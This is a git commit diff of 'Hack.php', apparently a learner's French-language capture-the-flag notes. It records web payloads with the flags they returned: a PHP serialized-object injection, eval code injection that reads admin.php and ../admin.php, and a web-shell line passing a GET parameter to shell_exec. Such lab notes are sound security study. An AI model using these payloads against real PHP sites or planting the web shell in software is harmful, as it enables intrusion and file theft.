6fa84cb2f0f7cfa7ee28f0e30dc36f30491ba8cf
DevTest <115026138+adrien-pago@users.noreply.github.com>
2024-02-19 17:24:08 +0100

    push

--- Hack.php
+++ Hack.php
@@ -1,13 +1,18 @@
 
-/// incrémentation 666
+////////// incrémentation 666 ///////
+//dans l'url taper
 O:4:"Game":2:{s:5:"score";i:666;s:3:"win";s:7:"win.php";}
 
+//réponse page web
 GG ! Flag = serialize_me_i_like_it_!
 
-//// Calculateur ///////
+/////////// Calculateur //////////////
+<?php
 $code = "echo file_get_contents('admin.php');";
 eval($code);
+?>
 
+//réponse page web
 <?php
 
 if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
@@ -20,4 +25,13 @@ echo "well done ! n3v3r_us3r_3v4l_!";
 $code = "echo file_get_contents('admin.php');"; eval($code); = echo file_get_contents('admin.php');
 
 
-////// dowload image /////
+///////////// dowload image ////////////
+<?php
+$code = "echo file_get_contents('../admin.php');";
+eval($code);
+
+shell_exec($_GET("cmd"))
+?>
+
+
+//////////////               //////////////
